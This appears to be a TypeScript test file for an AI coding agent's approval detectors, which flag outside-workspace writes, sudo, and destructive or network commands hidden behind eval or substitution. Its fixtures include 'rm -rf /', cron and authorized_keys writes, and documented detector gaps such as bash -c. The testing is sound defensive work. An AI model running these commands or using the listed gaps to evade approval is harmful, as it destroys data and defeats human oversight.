// Detector coverage: shell-side outside-writes (`tee`, `cp`/`mv`/`install`),
// `sudo` privilege escalation, and destructive/network verbs behind command
// indirection. The indirection unwrap runs to a bounded fixpoint
// (eval-of-substitution, nested substitutions, mixed backtick/`$()`), and the
// substitution closer is trimmed off LIFTED tokens only: trimming every target
// token would turn a literal trailing `)`/`]` on a plain path into a silent
// grant (a real sibling of the workspace read as inside). The remaining shapes
// are PINNED as the documented gaps they are, never silently assumed handled.
// The classifiers here are the PRODUCTION ones (defaultIsDestructive,
// isNetworkCommand, confinePath) wired exactly like triggerContextFor, so a
// green run proves the detectors work against what a real run classifies with —
// not against a stub that would hide an unwrap bug. Stated heuristics (not
// sandbox parsing): the last-argument target heuristic for tee/cp/mv/install,
// and word-boundary `sudo` matching that deliberately over-triggers — a raised
// capability becomes an ask, never a silent grant.
import {
  confinePath,
  defaultIsDestructive,
  isNetworkCommand,
} from '@kubic/agent/lane/interceptors';
import { DEFAULT_PERMISSIONS } from '@kubic/agent/permissions';
import { describe, expect, it } from 'vitest';
import { tempDir } from '../../../../test/temp-dir.js';
import { parseTomlConfig } from '../config/index.js';
import { installPolicy } from './install.js';
import { CAPABILITIES, validatePolicy } from './policy.js';
import { ApprovalService } from './service.js';
import type { TriggerContext } from './triggers.js';
import { detectTriggers, triggerContextFor } from './triggers.js';

function triggerContext(
  overrides: Partial<TriggerContext> = {},
): TriggerContext {
  return {
    workspace: '/work',
    network: 'none',
    isDestructive: defaultIsDestructive,
    isNetworkCommand,
    // Production wiring (triggerContextFor): confinePath decides, and it is
    // path-boundary aware — `/work-evil/b` is outside a `/work` workspace.
    isOutsideWorkspace: (path: string) => confinePath('/work', path).rewritten,
    ...overrides,
  };
}

describe('outside-write detectors', () => {
  it('raises outside-write when tee writes outside the workspace', () => {
    const ctx = triggerContext();
    expect(
      detectTriggers('bash', { command: 'cat x | tee /etc/cron.d/y' }, ctx),
    ).toEqual(['outside-write']);
    // Quotes around the target must not dodge the outside check.
    expect(
      detectTriggers('bash', { command: 'cat x | tee "/etc/cron.d/y"' }, ctx),
    ).toEqual(['outside-write']);
    // Inside targets stay quiet.
    expect(detectTriggers('bash', { command: 'tee inner.txt' }, ctx)).toEqual(
      [],
    );
    expect(
      detectTriggers('bash', { command: 'echo hi | tee -a build.log' }, ctx),
    ).toEqual([]);
  });

  it('raises outside-write on a copy destination outside the workspace (last-argument heuristic)', () => {
    const ctx = triggerContext();
    expect(detectTriggers('bash', { command: 'cp a /etc/b' }, ctx)).toEqual([
      'outside-write',
    ]);
    expect(
      detectTriggers('bash', { command: 'install -m 644 a /usr/local/b' }, ctx),
    ).toEqual(['outside-write']);
    // Inside destinations stay quiet.
    expect(detectTriggers('bash', { command: 'mv a ./b' }, ctx)).toEqual([]);
    expect(detectTriggers('bash', { command: 'mv a b' }, ctx)).toEqual([]);
    // The segment is scanned wherever it sits in the pipeline: a chained
    // tail must not hide an outside copy just because it is not last.
    expect(
      detectTriggers('bash', { command: 'cp a /etc/b && echo done' }, ctx),
    ).toEqual(['outside-write']);
  });

  it('treats a path sharing the workspace prefix as outside (path-boundary aware)', () => {
    const ctx = triggerContext();
    // `/work-evil/b` merely shares the `/work` prefix — it is outside.
    expect(
      detectTriggers('bash', { command: 'cp a /work-evil/b' }, ctx),
    ).toEqual(['outside-write']);
    expect(detectTriggers('bash', { command: 'cp a /work/b' }, ctx)).toEqual(
      [],
    );
    expect(
      detectTriggers('bash', { command: 'tee /work-evil/log' }, ctx),
    ).toEqual(['outside-write']);
  });

  it('raises no new triggers for plain builds and inside-workspace writes', () => {
    const ctx = triggerContext();
    expect(detectTriggers('bash', { command: 'npm install' }, ctx)).toEqual([
      'install',
    ]);
    expect(detectTriggers('bash', { command: 'cargo build' }, ctx)).toEqual([]);
    expect(detectTriggers('bash', { command: 'npm run build' }, ctx)).toEqual(
      [],
    );
    expect(detectTriggers('bash', { command: 'tee log.txt' }, ctx)).toEqual([]);
    expect(detectTriggers('bash', { command: 'cp a b' }, ctx)).toEqual([]);
    expect(
      detectTriggers('bash', { command: 'mv notes.txt archive/' }, ctx),
    ).toEqual([]);
  });

  it('trims the substitution-lifted delimiter off a write target', () => {
    const ctx = triggerContext();
    // A target lifted out of `$(…)` arrives with the substitution's closing
    // `)` glued on: `$(cp a /etc/b)` → `/etc/b)`. The boundary check must
    // still fire on a genuinely outside destination…
    expect(
      detectTriggers('bash', { command: 'echo $(cp a /etc/b)' }, ctx),
    ).toEqual(['outside-write']);
    expect(
      detectTriggers('bash', { command: 'echo $(tee /etc/cron.d/y)' }, ctx),
    ).toEqual(['outside-write']);
    // …and must not false-positive on an inside one just because of the lifted
    // delimiter. Before the trim, `/work)` resolved outside and raised a
    // spurious outside-write ask.
    expect(
      detectTriggers('bash', { command: 'echo $(cp a /work)' }, ctx),
    ).toEqual([]);
    // `]` is NOT a span closer: `$(tee /work])` names the literal path
    // `/work]`, a real sibling of the workspace, so it must raise (the
    // scoping block below covers that class).
    expect(
      detectTriggers('bash', { command: 'echo $(tee /work])' }, ctx),
    ).toEqual(['outside-write']);
    // Trimming must not weaken the boundary check: `/work-evil` is still
    // outside `/work` (dist vs dist-x), and a plain inside path stays quiet.
    expect(
      detectTriggers('bash', { command: 'echo $(cp a /work-evil/b)' }, ctx),
    ).toEqual(['outside-write']);
    expect(
      detectTriggers('bash', { command: 'echo $(cp a /work/b)' }, ctx),
    ).toEqual([]);
  });

  it('scopes the delimiter trim to lifted tokens; plain targets are never trimmed', () => {
    const ctx = triggerContext();
    // Trimming EVERY target token would silently drop a literal `)`/`]` at
    // the end of a real path and flip it from outside to inside — an ask would
    // become a silent grant (and there is no bash confine backstop for tee/cp
    // to catch it downstream). A plain token keeps its trailing characters
    // verbatim; only a token lifted out of `$(…)` loses the span's closer.
    // Without that scoping, every plain-target case below raises nothing.
    expect(detectTriggers('bash', { command: 'tee /work)' }, ctx)).toEqual([
      'outside-write',
    ]);
    expect(detectTriggers('bash', { command: "tee '/work)'" }, ctx)).toEqual([
      'outside-write',
    ]);
    expect(detectTriggers('bash', { command: "cp a '/work)'" }, ctx)).toEqual([
      'outside-write',
    ]);
    expect(
      detectTriggers('bash', { command: "echo x > '/work)'" }, ctx),
    ).toEqual(['outside-write']);
    expect(detectTriggers('bash', { command: 'tee /work]' }, ctx)).toEqual([
      'outside-write',
    ]);
    expect(
      detectTriggers('bash', { command: 'cp a /work/../work)' }, ctx),
    ).toEqual(['outside-write']);
    // The rule is general — any literal trailing character is path text,
    // not only the `)`/`]` the first cut trimmed: `tee /work,` names
    // `/work,`, a sibling of the workspace.
    expect(detectTriggers('bash', { command: 'tee /work,' }, ctx)).toEqual([
      'outside-write',
    ]);
    // The item-4 intent stays: a span-lifted token still loses exactly the
    // span's closer, so an inside destination stays quiet…
    expect(
      detectTriggers('bash', { command: 'echo $(cp a /work)' }, ctx),
    ).toEqual([]);
    // …while a genuinely outside lifted one still raises.
    expect(
      detectTriggers('bash', { command: 'echo $(cp a /etc/b)' }, ctx),
    ).toEqual(['outside-write']);
  });
});

describe('privilege escalation + indirection', () => {
  it('raises privilege-escalation for sudo anywhere in the command', () => {
    const ctx = triggerContext();
    // The acceptance case: sudo alone, and nothing else fires.
    expect(
      detectTriggers('bash', { command: 'sudo systemctl restart foo' }, ctx),
    ).toEqual(['privilege-escalation']);
    // The motivating command: outside-write AND privilege-escalation.
    expect(
      detectTriggers(
        'bash',
        { command: 'cat x | sudo tee /etc/cron.d/y' },
        ctx,
      ),
    ).toEqual(['outside-write', 'privilege-escalation']);
    // Word-boundary, anywhere — inside a substitution too.
    expect(detectTriggers('bash', { command: 'echo $(sudo id)' }, ctx)).toEqual(
      ['privilege-escalation'],
    );
    // Quoted context included: over-trigger is the documented, safe
    // direction — a raised capability becomes an ask, never a silent grant.
    expect(
      detectTriggers('bash', { command: 'echo "run sudo first"' }, ctx),
    ).toEqual(['privilege-escalation']);
    // Deduped: repeated sudo raises one capability.
    expect(detectTriggers('bash', { command: 'sudo sudo id' }, ctx)).toEqual([
      'privilege-escalation',
    ]);
  });

  it('raises the underlying capability for verbs behind indirection', () => {
    const ctx = triggerContext();
    // The acceptance cases: the substitution raises the UNDERLYING
    // capability instead of staying silent, and a benign substitution is
    // quiet. The production classifiers run on the unwrapped inner command
    // (`$(rm -rf /)` classifies as `rm -rf /`), which is exactly why the
    // wrapper must come off before the classifiers see it.
    expect(
      detectTriggers('bash', { command: 'echo "$(rm -rf /)"' }, ctx),
    ).toEqual(['destructive-shell']);
    expect(
      detectTriggers('bash', { command: 'echo "hello $(date)"' }, ctx),
    ).toEqual([]);
    expect(detectTriggers('bash', { command: 'echo `rm -rf /`' }, ctx)).toEqual(
      ['destructive-shell'],
    );
    expect(detectTriggers('bash', { command: 'eval "rm -rf /"' }, ctx)).toEqual(
      ['destructive-shell'],
    );
    expect(
      detectTriggers('bash', { command: 'eval rm -rf /tmp/x' }, ctx),
    ).toEqual(['destructive-shell']);
    expect(
      detectTriggers(
        'bash',
        { command: 'echo "$(curl https://x.example)"' },
        ctx,
      ),
    ).toEqual(['network']);
  });

  it('unwraps indirection to a fixpoint: eval-of-substitution and nesting', () => {
    const ctx = triggerContext();
    // A single-level unwrap truncates at the first `)`, so all three of these
    // would read as [] (silent) and a destructive verb behind a compound
    // wrapper would run unasked.
    expect(
      detectTriggers('bash', { command: 'eval $(rm -rf /)' }, ctx),
    ).toEqual(['destructive-shell']);
    expect(
      detectTriggers('bash', { command: 'echo $(echo $(rm -rf /))' }, ctx),
    ).toEqual(['destructive-shell']);
    expect(
      detectTriggers('bash', { command: 'echo `$(rm -rf /)`' }, ctx),
    ).toEqual(['destructive-shell']);
    // Deeper compounding unwraps too (balanced-paren scan)…
    expect(
      detectTriggers(
        'bash',
        { command: 'echo $(echo $(echo $(rm -rf /)))' },
        ctx,
      ),
    ).toEqual(['destructive-shell']);
    // …and quote/mixed wrappers unwrap through every layer.
    expect(
      detectTriggers('bash', { command: 'eval "$(rm -rf /)"' }, ctx),
    ).toEqual(['destructive-shell']);
    expect(
      detectTriggers('bash', { command: 'echo "$(echo `rm -rf /`)"' }, ctx),
    ).toEqual(['destructive-shell']);
    // The underlying-capability rule holds through unwrapping: what the
    // unwrapped inner command raises is what fires, nothing more.
    expect(
      detectTriggers(
        'bash',
        { command: 'eval $(curl https://x.example)' },
        ctx,
      ),
    ).toEqual(['network']);
    // Benign nesting stays quiet.
    expect(
      detectTriggers('bash', { command: 'echo $(echo $(date))' }, ctx),
    ).toEqual([]);
  });

  it('pins the effective nesting threshold: 31 levels raise, 32 stay silent', () => {
    const ctx = triggerContext();
    // The scan tracks at most MAX_UNWRAP_DEPTH (16) real openers; the
    // unmatched markers it pushes past the cap still consume closers, so
    // pairing shifts and the deepest RECORDED span carries (levels - 15)
    // `$(` layers: 16 layers at 31 nesting levels (the 16-step fixpoint
    // unwraps it fully, raising destructive-shell) and 17 at 32 (one layer
    // survives the 16 steps, so nothing classifies). Measured on the
    // production classifiers — the effective threshold is ~2x the cap,
    // stated in the module header and docs/cli/configuration.md.
    const nested = (levels: number) =>
      `echo ${'$('.repeat(levels)}rm -rf /${')'.repeat(levels)}`;
    expect(detectTriggers('bash', { command: nested(31) }, ctx)).toEqual([
      'destructive-shell',
    ]);
    expect(detectTriggers('bash', { command: nested(32) }, ctx)).toEqual([]);
  });

  it('pins the stated gap: interpreter-based verbs stay unraised', () => {
    const ctx = triggerContext();
    // `bash -c` / `python3 -c` / `node -e` hand the verb over as DATA to
    // another interpreter — a literal pattern cannot see it. These are the
    // documented gaps (module header + docs/cli/configuration.md), pinned
    // here so a future unwrap that closes them flips this test loudly
    // instead of drifting silently.
    expect(
      detectTriggers('bash', { command: 'bash -c "rm -rf /"' }, ctx),
    ).toEqual([]);
    expect(
      detectTriggers(
        'bash',
        { command: 'python3 -c "import shutil; shutil.rmtree(\'/\')"' },
        ctx,
      ),
    ).toEqual([]);
    // An rm word after a `(` reads as a command, quoted or not, so this one
    // raises: the scan is lexical, and an over-trigger is an ask.
    expect(
      detectTriggers(
        'bash',
        { command: 'python3 -c "import os; os.system(\'rm -rf /\')"' },
        ctx,
      ),
    ).toEqual(['destructive-shell']);
    expect(
      detectTriggers(
        'bash',
        { command: "node -e \"require('fs').rmSync('/', {recursive:true})\"" },
        ctx,
      ),
    ).toEqual([]);
  });

  it('keeps Set-deduped aggregation: one entry per distinct capability', () => {
    const ctx = triggerContext();
    expect(
      detectTriggers(
        'bash',
        { command: 'cat x | sudo tee /etc/cron.d/y && sudo tee /etc/z' },
        ctx,
      ),
    ).toEqual(['outside-write', 'privilege-escalation']);
  });

  it('keeps plain git commands trigger-free', () => {
    const ctx = triggerContext();
    expect(detectTriggers('bash', { command: 'git status' }, ctx)).toEqual([]);
    expect(
      detectTriggers('bash', { command: 'git log --oneline' }, ctx),
    ).toEqual([]);
    expect(
      detectTriggers('bash', { command: 'git commit -m "install docs"' }, ctx),
    ).toEqual([]);
  });

  it('round-trips privilege-escalation through config autoApprove', async () => {
    const parsed = parseTomlConfig(
      '[approvals]\nautoApprove = ["privilege-escalation"]\n',
    );
    const policy = validatePolicy(parsed.approvals);
    expect(policy.autoApprove).toEqual(['privilege-escalation']);
    expect(CAPABILITIES).toContain('privilege-escalation');
    const service = new ApprovalService({
      policy,
      awaitAnswer: () => {
        throw new Error('must not ask');
      },
    });
    await expect(
      service.request({
        key: 'pe-1',
        capability: 'privilege-escalation',
        toolName: 'bash',
        summary: 'privilege-escalation: sudo systemctl restart foo',
      }),
    ).resolves.toEqual({
      approved: true,
      by: 'autoApprove',
      justified: false,
    });
  });

  it('requires every raised capability: autoApprove covers only what it names', async () => {
    const dir = tempDir('approvals-detectors-');
    const installed = installPolicy({
      workspace: dir,
      sessionDir: dir,
      autoApprove: ['privilege-escalation'],
      maxPendingMs: 10,
      // A seat that never answers: the service's bound denies the call.
      answer: async () => undefined,
    });
    // Two capabilities raise and only one is auto-approved: outside-write
    // has no answer here, so the ask denies instead of slipping through on
    // the approved one.
    await expect(
      installed.ask({
        toolName: 'bash',
        args: { command: 'cat x | sudo tee /etc/x' },
        toolCallId: 'c1',
      }),
    ).resolves.toEqual({
      approved: false,
      reason: 'approval timed out after 10ms',
    });
  });
});

describe('capability vocabulary', () => {
  it('lists every capability once', () => {
    expect(new Set(CAPABILITIES).size).toBe(CAPABILITIES.length);
  });
});

describe('shell-expanded and cd-relative write targets', () => {
  it('treats ~, ~user, $HOME, braced HOME and $VAR prefixes as outside', () => {
    const ctx = triggerContext();
    for (const command of [
      'echo x >> ~/.bashrc',
      'echo x > $HOME/.zshrc',
      // biome-ignore lint/suspicious/noTemplateCurlyInString: literal shell syntax
      'echo x > ${HOME}/.profile',
      'echo x > "$HOME/.profile"',
      'echo x > ~root/.bashrc',
      'echo x > ~',
      'echo x > $OUT/file',
      'cp a ~/.ssh/authorized_keys',
      'tee ~/.config/x',
      'mv a $XDG_CONFIG_HOME/x',
    ]) {
      expect(detectTriggers('bash', { command }, ctx), command).toContain(
        'outside-write',
      );
    }
  });

  it('resolves relative targets against a preceding cd/pushd', () => {
    const ctx = triggerContext();
    for (const command of [
      'cd /etc && echo x > y',
      'pushd /tmp && cp a b',
      'cd /etc; tee y',
      'cd "/etc" && echo x > y',
      "cd '/etc' && cp a b",
      'cd -P /etc && echo x > y',
      'cd `pwd` && echo x > y',
      'cd /etc && cd sub && echo x > y',
      'cd .. && echo x > y',
      'cd sub && cd ../.. && echo x > y',
      // An unknown destination fails closed for relative targets.
      'cd && echo x > y',
      'cd ~ && echo x > y',
      'cd $HOME/x && echo x > y',
      'cd - && echo x > y',
      'pushd sub && popd && echo x > y',
    ]) {
      expect(detectTriggers('bash', { command }, ctx), command).toEqual([
        'outside-write',
      ]);
    }
  });

  it('keeps inside targets quiet, with or without a cd inside the workspace', () => {
    const ctx = triggerContext();
    for (const command of [
      'echo x > ./out.txt',
      'cd sub && echo x > y',
      'cd /work/sub && cp a b',
      'cd "sub dir" ; echo x > y',
      'cp a b/c',
      'cd /etc && echo x > /work/y',
      'cd -P sub && echo x > y',
      'cd -L -P sub && echo x > y',
      'cd -LP  sub && echo x > y',
      "cd '/work/sub' && echo x > y",
      // A redirect BEFORE the cd is resolved against the workspace.
      'echo x > y && cd /etc',
    ]) {
      expect(detectTriggers('bash', { command }, ctx), command).toEqual([]);
    }
  });

  it('always raises for a target under ~/.kubic, even when the workspace is home', () => {
    const home = '/home/u';
    const ctx = triggerContext({
      workspace: home,
      home,
      isOutsideWorkspace: (path: string) => confinePath(home, path).rewritten,
    });
    expect(
      detectTriggers(
        'bash',
        { command: 'echo {} > ~/.kubic/sessions/abc/posture.json' },
        ctx,
      ),
    ).toEqual(['outside-write', 'kubic-state-write']);
    expect(
      detectTriggers(
        'bash',
        { command: 'echo {} > /home/u/.kubic/sessions/abc/posture.json' },
        ctx,
      ),
    ).toEqual(['outside-write', 'kubic-state-write']);
    expect(
      detectTriggers(
        'bash',
        { command: 'echo {} > .kubic/sessions/abc/posture.json' },
        ctx,
      ),
    ).toEqual(['outside-write', 'kubic-state-write']);
    expect(
      detectTriggers(
        'write',
        { path: '/home/u/.kubic/sessions/abc/posture.json' },
        ctx,
      ),
    ).toEqual(['outside-write', 'kubic-state-write']);
    // A sibling that merely shares the prefix is an ordinary inside path.
    expect(
      detectTriggers('bash', { command: 'echo x > .kubicrc' }, ctx),
    ).toEqual([]);
    expect(detectTriggers('write', { path: 'notes.txt' }, ctx)).toEqual([]);
  });

  it('wires the home directory through triggerContextFor', () => {
    const home = tempDir('kubic-detectors-home-');
    const ctx = triggerContextFor(DEFAULT_PERMISSIONS, home, home);
    expect(ctx.home).toBe(home);
    expect(
      detectTriggers(
        'bash',
        { command: `echo {} > ${home}/.kubic/sessions/x/posture.json` },
        ctx,
      ),
    ).toEqual(['outside-write', 'kubic-state-write']);
  });
});
